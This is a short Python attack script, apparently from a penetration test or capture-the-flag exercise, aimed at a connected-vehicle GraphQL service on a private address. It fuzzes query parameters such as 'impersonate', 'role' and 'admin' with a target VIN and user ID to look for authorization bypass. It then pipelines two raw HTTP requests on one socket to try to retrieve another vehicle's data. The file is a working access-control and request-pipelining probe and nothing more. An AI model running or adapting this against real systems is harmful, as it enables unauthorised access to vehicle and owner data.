import requests, socket, time
URL="http://10.230.164.2:8080/graphql"
BASE='{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}'
VIN="CV6FF52FEE9EDDD86"; USER="cc-715a9a001b4a5abad5ce3ecc"
params=["vin","vehicle","vehicleId","id","token","api_key","apikey","session","user","tenant",
"campaign","op","operation","operationName","query","q","action","scope","role","as","impersonate",
"debug","internal","admin","fleet","device","tbox"]
vals=[VIN, USER, "1", "admin", "true"]
diffs=0
for p in params:
    for v in vals:
        try:
            r=requests.post(URL,params={p:v},json={"query":"{vehicles{vin label}}"},timeout=5)
            if r.text.strip()!=BASE:
                print("DIFF",p,v,r.status_code,r.text[:160],flush=True); diffs+=1
        except Exception as e: print("ERR",p,e)
print("param diffs",diffs)

# pipelining: two requests on one connection
s=socket.socket(); s.settimeout(5); s.connect(("10.230.164.2",8080))
def req(body, n):
    b=body.encode()
    return (f"POST /graphql HTTP/1.1\r\nHost: 10.230.164.2:8080\r\nContent-Type: application/json\r\nContent-Length: {len(b)}\r\n\r\n").encode()+b
s.sendall(req('{"query":"{vehicles{vin}}"}',1)+req('{"query":"{vehicle(vin:\\"'+VIN+'\\"){vin}}"}',2))
time.sleep(0.5)
data=b""
try:
    while True:
        c=s.recv(4096)
        if not c: break
        data+=c
except socket.timeout: pass
print("pipelined raw:", data.decode(errors="replace")[:600])
s.close()
